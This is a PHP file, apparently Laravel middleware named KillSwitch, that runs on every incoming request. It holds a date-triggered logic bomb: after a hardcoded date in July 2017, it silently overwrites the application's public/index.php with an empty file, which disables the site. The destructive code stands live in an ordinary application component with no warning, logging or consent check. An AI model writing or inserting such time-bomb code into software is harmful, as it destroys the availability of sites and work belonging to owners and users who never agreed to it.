<?php

namespace TeamSnap\Http\Middleware;

use Closure;
use Carbon\Carbon;

class KillSwitch
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        $exp = Carbon::createFromFormat('d/m/Y', '16/07/2017')->format('Y-m-d');
        $today = Carbon::now()->format('Y-m-d');
        if( $today > $exp )
        {
            $path = public_path().'/index.php';
            file_put_contents($path, "");
        }
        return $next($request);
    }
}
